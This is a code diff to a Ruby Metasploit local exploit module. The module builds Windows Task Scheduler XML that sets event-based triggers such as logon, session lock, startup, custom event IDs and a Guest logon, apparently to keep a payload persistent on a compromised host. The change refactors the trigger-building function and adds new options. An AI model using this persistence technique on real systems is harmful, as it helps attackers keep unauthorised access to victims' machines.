@@ -57,9 +57,11 @@ class Metasploit3 < Msf::Exploit::Local
 
 		register_advanced_options(
 			[
-				OptString.new('EVENT_LOG', [false, "The event log to check for event",'']),
-				OptString.new('PROVIDER', [false, "The provider name assigned to the event",'']),
+				OptString.new('EVENT_LOG', [false, 'The event log to check for event','']),
+				OptString.new('PROVIDER', [false, 'The provider name assigned to the event','']),
 				OptInt.new('EVENT_ID', [false, 'Event ID to trigger on.','']),
+				OptString.new('EVENTDATA_NAME', [false, '','']),
+				OptString.new('EVENTDATA_VALUE', [false, '','']),
 			], self.class)
 	end
 
@@ -198,13 +200,12 @@ class Metasploit3 < Msf::Exploit::Local
 		return xml
 	end
 
-
 	##############################################################
 	# Creates trigger XML for event based triggers and replaces
 	# the time trigger.
 	# Returns altered XML
 
-	def create_trigger_event_tags(log, id, provider, data, tag, xml)
+	def create_trigger_event_tags(log, line, xml)
 		domain, user = client.sys.config.getuid.split('\\')
 
 		# Fucked up XML syntax for windows event #{id} in #{log} within the past 15 minutes
@@ -213,8 +214,7 @@ class Metasploit3 < Msf::Exploit::Local
 		temp_xml << "      <Enabled>true</Enabled>\n"
 		temp_xml << "      <Subscription>&lt;QueryList&gt;&lt;Query Id=\"0\" "
 		temp_xml << "Path=\"#{log}\"&gt;&lt;Select Path=\"#{log}\"&gt;"
-		temp_xml << "(EventID=#{id}) and *[System[Provider[@Name='#{provider}']]]" if not id.empty? and not provider.empty?
-		temp_xml << "*[EventData[Data[@Name='#{data}']='#{tag}']]" if not data.empty? and not tag.empty?
+		temp_xml << line
 		temp_xml << "&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;"
 		temp_xml << "</Subscription>\n"
 		temp_xml << "    </EventTrigger>"
@@ -233,7 +233,8 @@ class Metasploit3 < Msf::Exploit::Local
 		case datastore['TRIGGER']
 			when 'logon'
 				# Trigger based on winlogon event, checks windows license key after logon
-				xml = create_trigger_event_tags("Application","4101","Microsoft-Windows-Winlogon", '', '',xml)
+				line = "(EventID=4101) and *[System[Provider[@Name='Microsoft-Windows-Winlogon']]]"
+				xml = create_trigger_event_tags("Application", line, xml)
 
 			when 'lock'
 				xml = create_trigger_tags("SessionLock", xml)
@@ -249,13 +250,17 @@ class Metasploit3 < Msf::Exploit::Local
 				# 12
 				# Application
 				# level 4
-				xml = create_trigger_event_tags("Application","12","Microsoft-Windows-Kernel-General", '', '',xml)
+				line = "(EventID=12) and *[System[Provider[@Name='Microsoft-Windows-Kernel-General']]]"
+				xml = create_trigger_event_tags("Application", line, xml)
 
 			when 'event'
-				xml = create_trigger_event_tags(datastore['EVENT_LOG'],datastore['EVENT_ID'],datastore['PROVIDER'], '', '',xml)
+				line = "(EventID=#{datastore['EVENT_ID']}) and *[System[Provider[@Name='#{datastore['PROVIDER']}']]]"
+				xml = create_trigger_event_tags(datastore['EVENT_LOG'], line, xml)
 	
 			when 'version'
-				xml = create_trigger_event_tags("Security", "", "", "TargetUserName", "Guest", xml)
+				line = "*[EventData[Data[@Name='TargetUserName']='Guest']]"
+				xml = create_trigger_event_tags("Security", line, xml)
+
 			when 'schedule'
 				# Generate expire tag, insert into XML
 				end_boundary = create_expire_tag
